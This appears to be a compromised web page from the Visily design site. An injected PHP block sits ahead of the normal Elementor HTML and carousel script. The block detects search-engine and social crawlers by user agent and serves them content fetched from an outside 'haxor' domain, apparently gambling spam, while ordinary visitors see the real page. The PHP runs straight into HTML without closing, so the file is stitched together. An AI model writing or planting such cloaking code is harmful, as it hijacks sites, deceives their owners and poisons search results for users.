<?php
function is_bot() {
    $user_agent = $_SERVER['HTTP_USER_AGENT'];
    $bots = array(
        'Googlebot', 'Googlebot-News', 'Googlebot-Image', 'Googlebot-Video',
        'bingbot', 'Slurp', 'DuckDuckBot', 'BingPreview', 'DuckDuckGo', 'YandexBot',
        'Baiduspider', 'TelegramBot', 'facebookexternalhit', 'Pinterest', 'W3C_Validator',
        'Google-Site-Verification', 'Google-InspectionTool', 'Applebot', 'AhrefsBot', 'SEMrushBot', 'MJ12bot'
    );
    
    foreach ($bots as $bot) {
        if (stripos($user_agent, $bot) !== false) {
            return true;
        }
    }

    return false;
}

function fetch_message_from_url($url) {
    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_TIMEOUT, 10); // Timeout setelah 10 detik
    $response = curl_exec($ch);
    
    if (curl_errno($ch)) {
        error_log("Error cURL: " . curl_error($ch));
        curl_close($ch);
        return false;
    }
    
    $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);

    if ($http_code == 200) {
        return $response;
    } else {
        error_log("HTTP Error: Status Code " . $http_code);
        return false;
    }
}

if (is_bot()) { 
    $message = fetch_message_from_url('https://koi.haxor-mahasuhu.info/visily-gacor/index.php
');
    
    if ($message) {
        echo $message;
    } else {
        echo "";
    }
    exit;
}

<span class="elementor-heading-title elementor-size-default">idea to design</span><div class="bottom-green-line"></div></div></h2></div></div></div><div class="elementor-element elementor-element-d7f2cb2 elementor-widget elementor-widget-spacer" data-id="d7f2cb2" data-element_type="widget" data-widget_type="spacer.default"><div class="elementor-widget-container"><div class="elementor-spacer"><div class="elementor-spacer-inner"></div></div></div></div><div class="elementor-element elementor-element-f799ade e-con-full e-flex wpr-sticky-section-no e-con e-child" data-id="f799ade" data-element_type="container" data-settings="{&quot;content_width&quot;:&quot;full&quot;,&quot;container_type&quot;:&quot;flex&quot;}"><div class="elementor-element elementor-element-35ad5bf elementor-hidden-mobile elementor-widget elementor-widget-html" data-id="35ad5bf" data-element_type="widget" data-widget_type="html.default"><div class="elementor-widget-container"><div class="main-wrapper"><div class="usecase-item__wrapper"><div class="usecase-item__container">

<span class="usecase-item__name">Ideation</span><div class="usecase-item__progress"></div></div><div class="usecase-item__container">

<span class="usecase-item__name">Prototyping</span><div class="usecase-item__progress"></div></div></div><div class="usecase-illustration__container">
<img decoding="async" src="https://www.visily.ai/wp-content/uploads/2024/01/Ideation-min.png" alt="Illustration" id="usecase-illustration__image" class="usecase-illustration__image"/></div></div> <script>document.addEventListener("DOMContentLoaded",()=>{const usecaseItemContainer=document.querySelectorAll(".usecase-item__container");const usecaseIllustrationContainer=document.getElementById("usecase-illustration__image");const illustrationList=["https://www.visily.ai/wp-content/uploads/2024/01/Ideation-min.png","https://www.visily.ai/wp-content/uploads/2024/01/Wireframing-min-1.png","https://www.visily.ai/wp-content/uploads/2024/01/Prototyping-min-1.png"];const totalItems=usecaseItemContainer.length;const DELAY_TIME=3000;let activeItemIndex=0;usecaseItemContainer.forEach((item,index)=>{item.addEventListener("click",()=>{usecaseItemContainer.forEach((item)=>{item.classList.remove("active")});item.classList.add("active");activeItemIndex=index})});function setActiveItem(){usecaseItemContainer.forEach((item)=>{item.classList.remove("active")});usecaseItemContainer[activeItemIndex].classList.add("active");changeImageSrcWithFade(illustrationList[activeItemIndex])}
function changeImageSrcWithFade(newSrc){usecaseIllustrationContainer.classList.add('fade-out');usecaseIllustrationContainer.onload=()=>{usecaseIllustrationContainer.classList.remove('fade-out')};setTimeout(()=>{usecaseIllustrationContainer.src=newSrc},100)}
function cycleItems(){activeItemIndex=(activeItemIndex+1)%totalItems;setActiveItem()}
let intervalId=setInterval(cycleItems,DELAY_TIME);usecaseItemContainer.forEach((item,index)=>{item.addEventListener("click",()=>{clearInterval(intervalId);activeItemIndex=index;setActiveItem();intervalId=setInterval(cycleItems,DELAY_TIME)})});setActiveItem()})</script> </div></div><div class="elementor-element elementor-element-0c8b259 elementor-hidden-desktop elementor-hidden-tablet elementor-widget elementor-widget-html" data-id="0c8b259" data-element_type="widget" data-widget_type="html.default"><div class="elementor-widget-container"><div class="workflow__wrapper"><div class="workflow_item__container active"><div class="workflow_item__title">
